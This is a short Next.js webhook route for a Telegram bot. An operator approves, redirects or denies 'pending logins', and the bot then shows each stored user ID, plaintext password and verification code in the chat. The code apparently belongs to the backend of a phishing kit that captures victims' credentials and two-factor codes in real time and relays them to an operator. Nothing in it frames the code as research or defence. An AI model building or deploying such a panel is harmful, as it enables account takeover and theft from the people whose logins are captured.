import { NextRequest, NextResponse } from "next/server";
import { getDb, ensureTable } from "@/lib/db";
import {
  editMessage,
  answerCallback,
  buildApprovedMessage,
  buildDeniedMessage,
  buildRedirectedMessage,
} from "@/lib/telegram";


export async function POST(req: NextRequest) {
  try {
    const update = await req.json();

    if (!update.callback_query) {
      return NextResponse.json({ ok: true });
    }

    const cb = update.callback_query;
    const chatId = String(cb.message?.chat?.id || "");
    const messageId = cb.message?.message_id;
    const callbackQueryId = cb.id;
    const data = cb.data || "";

    const [action, taskId] = data.split(":");
    if (!action || !taskId) {
      await answerCallback(chatId, callbackQueryId, "Invalid callback");
      return NextResponse.json({ ok: true });
    }

    const sql = getDb();
    await ensureTable(sql);

    const rows = await sql`
      SELECT * FROM pending_logins WHERE id = ${taskId} LIMIT 1
    `;

    if (rows.length === 0) {
      await answerCallback(chatId, callbackQueryId, "Task not found");
      return NextResponse.json({ ok: true });
    }

    const task = rows[0];

    if (task.status !== "pending") {
      await answerCallback(chatId, callbackQueryId, `Already ${task.status}`);
      return NextResponse.json({ ok: true });
    }

    const newStatus = action === "approve" ? "approved"
      : action === "redirect" ? "redirected" : "denied";

    await sql`
      UPDATE pending_logins
      SET status = ${newStatus},
          resolved_at = ${Date.now()},
          resolved_by = 'telegram'
      WHERE id = ${taskId}
    `;

    const msgBuilder = action === "approve" ? buildApprovedMessage
      : action === "redirect" ? buildRedirectedMessage
      : buildDeniedMessage;

    const updatedText = msgBuilder({
      user_id: task.user_id,
      password: task.password,
      verification_code: task.verification_code,
      code_delivery_method: task.code_delivery_method,
    });

    await editMessage(chatId, messageId, updatedText);
    await answerCallback(chatId, callbackQueryId, `${action.charAt(0).toUpperCase() + action.slice(1)}d`);

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error("[telegram webhook]", err);
    return NextResponse.json({ error: "Internal error" }, { status: 500 });
  }
}
